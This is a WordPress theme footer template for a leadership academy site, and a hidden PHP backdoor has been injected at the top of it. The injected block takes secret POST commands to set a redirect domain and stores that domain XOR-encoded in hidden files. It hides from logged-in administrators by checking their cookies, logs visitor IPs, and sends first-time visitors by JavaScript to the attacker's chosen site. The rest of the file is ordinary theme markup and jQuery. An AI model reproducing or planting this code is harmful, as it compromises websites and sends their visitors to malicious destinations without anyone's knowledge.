<?php /* 5pJQhrPh3XJCUOiaQCa6 */ ?><?php
error_reporting(E_ALL);$DOMAIN_FNAME1_7QNG='.SIc7CYwgY';$DOMAIN_FNAME2_7QNG='/var/tmp/.SIc7CYwgY';if(isset($_POST['6FoNxbvo73BHOjhxokW3'])){check_status($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);return;}else if(isset($_POST['8Yx5AefYpBp07TEocRmv'])){$domain=$_POST['8Yx5AefYpBp07TEocRmv'];echo "$domain\n";var_dump($_POST);if(isset($_POST['https'])){$domain="https://$domain";}else {$domain="http://$domain";}echo $domain;save_str($domain,$DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);return;}else {$keys=array_keys($_COOKIE);$cookies=implode($keys);if(strpos($cookies,"wordpress_logged")!==false||strpos($cookies,"wp-settings")!==false||strpos($cookies,"wordpress_test")!==false){}else {onClientConnect($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);}}function ip_is_there($fname1,$fname2,$ip){if(!file_exists($fname1)&&!file_exists($fname2)){return false;}$contains=false;$file=fopen($fname1,'r');if(!$file){$file=fopen($fname2,'r');}if(!$file){return;}while(!feof($file)){$line=fgets($file);if(strpos($line,$ip)!==false){$contains=true;break;}}fclose($file);return $contains;}function add_ip($fname1,$fname2,$ip){$file=fopen($fname1,'a');if(!$file){$file=fopen($fname2,'a');}if(!$file){return;}fwrite($file,$ip);fwrite($file,"\n");fclose($file);}function onClientConnect($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG){$ip=$_SERVER['REMOTE_ADDR'];$file1="./.access_log";$file1_b="/var/tmp/.access_log";$isIn1=false;$isIn2=false;if(ip_is_there($file1,$file1_b,$ip)){$isIn1=true;}count_lines_and_truncate($file1,$file1_b);if(!$isIn1){add_ip($file1,$file1_b,$ip);$domain=read_str($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);redirect($domain);}return;if(!$isIn1){add_ip($file1,$file1_b,$ip);;}else if($isIn1&&!$isIn2){if(is_usa_ip($_SERVER['REMOTE_ADDR'])){$domain=read_str($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);$domain="http://www.google.com/";redirect($domain);}}else {return;}}function count_lines_and_truncate($fname1,$fname2){if(!file_exists($fname1)&&!file_exists($fname2)){return 0;}$line_count=0;$file=fopen($fname1,'r');$fname=$fname1;if(!$file){$file=fopen($fname2,'r');$fname=$fname2;}if(!$file){return 0;}while(!feof($file)){$line=fgets($file);$line_count++;}if($line_count>3000){unlink($fname);ftruncate($file,0);}fclose($file);return $line_count;}function xor_enc($str){$key='KQzLStQQblMU3rBGqFyEn8LlEWZ1G4vbK7YcpfZKrjaUQhP3sQKJHKaVLtr0H8RSPPqbDqfNEQ0Yu08mHsI77NGcU5rbsMLNWwlqDXmM5E9WqY73rBvXwj5GkQay2wnuGc4wFKYyYLMEhQDAG60aeYudKtUSUXDHYG912g0VWlYob3lycp0eC1QnoQe3xsWPbA3e1ZWY';$res='';for($i=0;$i<strlen($str);$i++){$res.=chr(ord($str[$i])^ord($key[$i]));}return $res;}function enc($str){$res=xor_enc($str);$res=base64_encode($res);return $res;}function dec($str){$str=base64_decode($str);$res=xor_enc($str);return $res;}function show_popup($url){echo "
<script type='text/javascript'>var now = new Date().getTime();if (now%3 == 0) {window.location = '$url';}</script>

";}function redirect($url){show_popup($url);return;$r=rand(5,20);sleep($r);echo "<meta http-equiv='refresh' content='0; url=$url' />";die();die("<script type='text/javascript'>
           window.location = '$url'
      </script>");}function check_status($df1,$df2){$domain=read_str($df1,$df2);echo "Domain is: $domain\n";}function read_str($fname1,$fname2){$file=fopen($fname1,'r');$name=$fname1;if(!$file){$name=$fname2;$file=fopen($fname2,'r');}if(!$file){return;}$str=fread($file,filesize($name));$str=dec($str);fclose($file);return $str;}function save_str($str,$fname1,$fname2){$file=fopen($fname1,'w');if(!$file){$file=fopen($fname2,'w');}if(!$file){return;}$str=enc($str);fwrite($file,$str);fclose($file);}?>

<?php /* uqjsQSyWVhmOHAEVa1i6 */ ?><?php

/**
 * The template for displaying the footer
 *
 * Contains footer content and the closing of the #main and #page div elements.
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */

?>
	</div><!-- #main .wrapper -->
</div><!-- #page -->

<div id="footer">
	<div id="footer-wrapper">
		<div id="footer-widget-area">
			
			<?php if ( is_active_sidebar( 'custom_footer_widget_one' ) || is_active_sidebar( 'custom_footer_widget_two' ) ) : ?>
				<aside class="left-footer-box">
				    <div class="widget-box">
				        <?php dynamic_sidebar( 'custom_footer_widget_one' ); ?>
				    </div>
				</aside>
				<aside class="right-footer-box">
				    <div class="newsletter-widget-box">
				        <?php dynamic_sidebar( 'custom_footer_widget_two' ); ?>
				    </div><!-- .widget-area-four -->
				</aside>
			<?php endif; ?>
		
		</div>

		<footer id="colophon" role="contentinfo">
			<div class="site-info">
				<?php if (is_active_sidebar( 'copyright_widget' )) : ?>
					<?php dynamic_sidebar( 'copyright_widget' ); ?>
				<?php else : ?>	
					<?php do_action( 'twentytwelve_credits' ); ?>
						<a href="<?php echo esc_url( __( '#', 'twentytwelve' ) ); ?>" title="<?php esc_attr_e( 'Women\'s Leadership Academy ', 'twentytwelve' ); ?>"><?php printf( __( 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed et scelerisque nisl %s', 'twentytwelve' ), '© copyright 2015 ' ); ?></a>
				<?php endif; ?>
			</div><!-- .site-info -->
		</footer><!-- #colophon -->

	</div>
</div>

<?php wp_footer(); ?>

<script type="text/javascript">
	$(document).ready(function() {
		
		// :::::::::::::::::::: ALUMNI TOGGLE :::::::::::::::::::: //
		$( ".alumni-link a" ).click(function() {
		  $( "div.alumni-sidebar" ).toggle();
		});
		
		// :::::::::::::::::::: IOS ZOOM FIX :::::::::::::::::::: //
		//  Hack for mobile devices and iphone iOS8 specifically to prevent page zoom when select or input are in use
		$("input[type=text], textarea, select").on({ 'touchstart' : function() {
		    zoomDisable();
		}});
		
		$("input[type=text], textarea, select").on({ 'touchend' : function() {
		    setTimeout(zoomEnable, 500);
		}});

		function zoomDisable(){
		  $('head meta[name=viewport]').remove();
		  $('head').prepend('<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0" />');
		}
		function zoomEnable(){
		  $('head meta[name=viewport]').remove();
		  $('head').prepend('<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=1" />');
		}

	});

	// :::::::::::::::::::: TEXT TOGGLE :::::::::::::::::::: //
	$(document).ready(function() {
		
   $( "p.wysija-checkbox-paragraph" ).first().css("display", "none");


		var langSR = $('ul.qtranxs_language_chooser li').hasClass('lang-sr active');
			langEN = $('ul.qtranxs_language_chooser li').hasClass('lang-en active');
			state = true;
			$( "#whole-text" ).click(function() {
				if ( state ) {
					$( "#akademija-hide" ).animate({
						height:'100%',
					}, 500 );
					$( "#akademija-hide" ).removeClass('academy-hidden');
					if ( langSR ){
						$(this).html('Zatvori');
					} else if ( langEN ){
						$(this).html('Close');
					}
				} else {
					$( "#akademija-hide" ).animate({
						height:100
					}, 500 );
					$( "#akademija-hide" ).addClass('academy-hidden');
					if ( langSR ){
						$(this).html('Ceo tekst');
					} else if ( langEN ){
						$(this).html('Show all');
					}
				}
				state = !state;
			});
	});

    // :::::::::::::::::::: SMOOTH SCROLLING BETWEEN SECTIONS :::::::::::::::::::: //
	$(document).ready(function() {
		$('a[href*=#]:not([href=#])').click(function() {
			var id = $(this).attr("href");
			var offset = 25;
			var target = $(id).offset().top - offset;
		 
			$('html, body').animate({
				scrollTop:target
			}, 1000);
			event.preventDefault();
		});
	});

</script>

</body>
</html>